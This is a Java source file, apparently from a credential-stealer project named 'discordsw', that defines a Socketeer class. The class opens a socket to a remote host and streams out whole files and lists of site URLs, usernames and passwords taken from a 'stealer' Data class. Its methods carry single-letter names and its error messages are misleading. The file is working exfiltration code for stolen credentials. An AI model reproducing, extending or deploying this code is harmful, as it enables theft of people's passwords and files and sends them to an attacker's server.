package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.Data;

import java.io.*;
import java.net.Socket;
import java.util.List;

public class Socketeer {

    private Socket socket;
    private OutputStream stream;

    public Socketeer(String host, int port) {
        try {
            socket = new Socket(host, port);
            stream = socket.getOutputStream();
        } catch (Exception e) {
            ErrorWindow.run("Error when establishing connection, code:0001");
            e.printStackTrace();
        }
    }

    public void f(File g) throws IOException {
        if(!g.exists()) {
            ErrorWindow.run("Error when establishing connection, code:0002");
        }
        FileInputStream i = new FileInputStream(g);
        byte[] j = new byte[4096];

        while (i.read(j) > 0) {
            stream.write(j);
        }

        i.close();
        stream.flush();
    }

    public void h(List<Data> dataList) throws IOException {
        if(dataList.isEmpty()) {
            return;
        }
        StringBuilder builder = new StringBuilder();
        for(Data d : dataList) {
            builder.append(d.siteURL + ", " + d.username + ", " + d.password);
        }
        ByteArrayInputStream i = new ByteArrayInputStream(builder.toString().getBytes());
        byte[] j = new byte[4096];

        while (i.read(j) > 0) {
            stream.write(j);
        }

        i.close();
        stream.flush();
    }

    public void close() throws IOException {
        stream.close();
    }
}